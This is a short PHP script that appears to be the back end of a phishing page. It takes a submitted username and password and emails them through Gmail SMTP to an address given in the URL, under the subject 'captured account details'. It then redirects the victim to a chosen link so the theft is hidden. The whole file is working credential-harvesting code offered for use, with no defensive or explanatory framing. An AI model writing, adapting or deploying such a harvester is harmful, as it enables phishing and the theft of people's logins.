<?php
$username = $_POST['username'];
$password_key = $_POST['password'];

// Get the email id and link from the URL parameters
$email = $_GET['id'];
$link = $_GET['link'];

require 'vendor/autoload.php';
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = 2;                                 
    $mail->isSMTP();                                      
    $mail->Host = 'smtp.gmail.com';  
    $mail->SMTPAuth = true;                               
    $mail->Username = 'animehv5500@gmai.com';                 
    $mail->Password = '';                           
    $mail->SMTPSecure = 'tls';                            
    $mail->Port = 587;                                    

    //Recipients
    $mail->setFrom('animehv5500@gmai.com', 'Mailer');
    $mail->addAddress($email, 'Harsh');     

    //Content
    $mail->isHTML(true);                                  
    $mail->Subject = 'The captrued account details are here';
    $mail->Body    = "Captured details are<br>Username: $username<br>Password Key: $password_key";

    $mail->send();
    echo 'Message has been sent';
    header("Location: $link");
    exit;
} catch (Exception $e) {
    echo 'Message could not be sent. Mailer Error: ', $mail->ErrorInfo;
}

?>